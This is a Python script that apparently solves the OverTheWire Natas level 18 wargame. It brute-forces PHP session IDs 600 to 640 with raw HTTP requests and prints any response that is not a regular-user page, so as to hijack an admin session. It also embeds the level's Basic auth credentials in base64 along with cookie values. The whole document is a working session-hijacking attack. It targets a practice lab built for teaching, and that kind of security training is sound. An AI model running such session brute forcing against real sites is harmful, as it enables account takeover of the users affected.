import socket

string = ""
for x in range(600, 641):
    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    send.connect(("178.79.134.250", 80))
    data = "GET / HTTP/1.1\r\n"
    data += "Host: natas18.natas.labs.overthewire.org\r\n"
    data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=" + str(x) + "\r\n"
    data += "Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==\r\n"
    data += "\r\n"
    send.send(data.encode())
    recv = send.recv(1500)
    recv = recv.decode()
    print(x)
    if "You are logged in as a regular user" not in recv:
        print(str(x) * 25)
        string += recv
        print(string)

    else:
        pass
    
    send.close()
